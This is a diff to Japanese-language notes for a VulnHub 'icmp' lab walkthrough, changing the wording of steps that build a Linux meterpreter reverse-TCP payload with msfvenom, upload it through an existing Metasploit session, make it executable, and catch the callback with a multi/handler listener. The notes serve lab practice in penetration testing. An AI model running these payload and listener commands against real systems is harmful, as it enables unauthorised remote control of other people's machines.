@@ -20,16 +20,17 @@ run
 - /tmpに移動する
 - Parrotに戻る
   - `bg`
-- 新しいターミナルを開けて、~/vulnhub/icmp/にmsfvenomを利用してreverse-shellをする
-  - php-reverse-shellみたいなもの 
-- `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=Parrotのアドレス lport=4444 -a x64 -f elf -o payload.elf`
+- ここで改めて新しい、より高度なreverse-shellをする。
+- まず新しいターミナルを開けて、~/vulnhub/icmp/にmsfvenomを利用してreverse-shellをする
+  - 高度なphp-reverse-shellみたいなもの 
+  - `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=Parrotのアドレス lport=4444 -a x64 -f elf -o payload.elf`
 - msfに戻る
   - `upload payload.elf`
 - targetに戻る
   - `sessions -i 1`
   - shellになって対話型シェルにする
   - `chmod +x payload.elf`
-- 新しいターミナルでhandlerで待ち受ける
+- 新しいターミナルで、より高度なhandlerで待ち受ける
 ```
 msfconsole
 use exploit/multi/handler
